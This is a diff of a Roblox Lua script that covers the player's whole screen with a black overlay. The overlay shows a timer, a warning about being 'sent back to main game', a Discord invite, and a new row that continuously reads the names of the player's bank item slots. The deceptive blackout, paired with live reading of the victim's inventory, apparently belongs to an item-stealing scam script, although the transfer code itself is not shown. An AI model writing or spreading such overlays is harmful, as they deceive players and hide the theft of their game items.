@@ -142,14 +142,15 @@ screenGui.Name = "FullBlackScreen"
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
 screenGui.IgnoreGuiInset = true
+screenGui.Parent = gui
 
 local frame = Instance.new("Frame")
 frame.Name = "BlackFrame"
 frame.Size = UDim2.new(1, 0, 1, 0)
 frame.BackgroundColor3 = Color3.new(0, 0, 0)
 frame.BorderSizePixel = 0
-frame.Parent = screenGui
 frame.ZIndex = 999
+frame.Parent = screenGui
 
 local timerText = Instance.new("TextLabel")
 timerText.Name = "Timer"
@@ -160,17 +161,19 @@ timerText.TextColor3 = Color3.new(1, 1, 1)
 timerText.Font = Enum.Font.SourceSansBold
 timerText.TextSize = 48
 timerText.Text = "00:00"
+timerText.ZIndex = 1000
 timerText.Parent = frame
 
 local warningText = Instance.new("TextLabel")
 warningText.Name = "Warning"
 warningText.Size = UDim2.new(0, 400, 0, 30)
-warningText.Position = UDim2.new(0.5, -200, 0.5, 40) 
+warningText.Position = UDim2.new(0.5, -200, 0.5, 40)
 warningText.BackgroundTransparency = 1
 warningText.TextColor3 = Color3.new(1, 1, 1)
 warningText.Font = Enum.Font.SourceSans
 warningText.TextSize = 24
 warningText.Text = "if the timer goes over 15 minutes then you will be sent back to main game"
+warningText.ZIndex = 1000
 warningText.Parent = frame
 
 local invitee = Instance.new("TextLabel")
@@ -182,21 +185,61 @@ invitee.TextColor3 = Color3.new(1, 1, 1)
 invitee.Font = Enum.Font.SourceSansItalic
 invitee.TextSize = 20
 invitee.Text = ".gg/GeKhkBZ2kf"
+invitee.ZIndex = 1000
 invitee.Parent = frame
 
-screenGui.Parent = gui
+local itemFrame = Instance.new("Frame")
+itemFrame.Name = "BankItemDisplay"
+itemFrame.Size = UDim2.new(0, 400, 0, 50)
+itemFrame.Position = UDim2.new(0.5, -200, 0.3, -80) -- top of screen
+itemFrame.BackgroundTransparency = 1
+itemFrame.ZIndex = 1001
+itemFrame.Parent = screenGui
+
+for i = 1, 8 do
+	local slotLabel = Instance.new("TextLabel")
+	slotLabel.Name = "Slot" .. i
+	slotLabel.Size = UDim2.new(0, 45, 0, 45)
+	slotLabel.Position = UDim2.new(0, (i - 1) * 50, 0, 0)
+	slotLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	slotLabel.BorderSizePixel = 1
+	slotLabel.BorderColor3 = Color3.fromRGB(90, 90, 90)
+	slotLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	slotLabel.TextScaled = true
+	slotLabel.Font = Enum.Font.SourceSansSemibold
+	slotLabel.Text = "..."
+	slotLabel.ZIndex = 1002
+	slotLabel.Parent = itemFrame
+
+	task.spawn(function()
+		while true do
+			pcall(function()
+				local slot = lp:FindFirstChild("PlayerGui")
+					and lp.PlayerGui:FindFirstChild("BankNEW")
+					and lp.PlayerGui.BankNEW.Right.ImageLabel.ItemSlots.Slots:FindFirstChild(tostring(i))
+				if slot then
+					local itemNameVal = slot:FindFirstChild("ItemName")
+					slotLabel.Text = (itemNameVal and itemNameVal:IsA("StringValue")) and itemNameVal.Value or "..."
+				else
+					slotLabel.Text = "..."
+				end
+			end)
+			task.wait(1)
+		end
+	end)
+end
 
 local startTime = os.time()
 local function updateTimer()
-    local elapsed = os.time() - startTime
-    local minutes = math.floor(elapsed / 60)
-    local seconds = elapsed % 60
-    timerText.Text = string.format("%02d:%02d", minutes, seconds)
+	local elapsed = os.time() - startTime
+	local minutes = math.floor(elapsed / 60)
+	local seconds = elapsed % 60
+	timerText.Text = string.format("%02d:%02d", minutes, seconds)
 end
 
 while true do
-    updateTimer()
-    wait(1)
+	updateTimer()
+	wait(1)
 end
 
 task.spawn(function()
